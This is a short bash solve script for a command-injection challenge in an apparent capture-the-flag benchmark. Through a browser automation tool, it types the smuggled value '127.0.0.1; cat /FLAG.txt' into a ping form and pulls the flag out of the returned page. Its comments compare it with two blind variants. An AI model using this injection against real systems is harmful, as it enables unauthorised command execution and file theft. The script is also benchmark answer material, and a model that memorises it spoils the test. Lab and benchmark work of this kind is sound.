#!/usr/bin/env bash
# XBEN-073-24 — "Is There Anybody Out There?" (tags: command_injection)
#
# The same ping form as XBEN-037 and XBEN-045, with the output *printed*. That
# one difference collapses the whole problem: where 037 needed 256 requests to
# recover the flag a bit at a time, this needs one, because the command's stdout
# comes back in the page.
#
# Worth keeping all three. They are the same bug at three levels of
# observability, and they show what the workbench is for: the blind ones need
# hundreds of replays and an oracle, this one needs a single request typed into
# a form.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben073-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "input" "127.0.0.1; cat /FLAG.txt" --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Ping" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
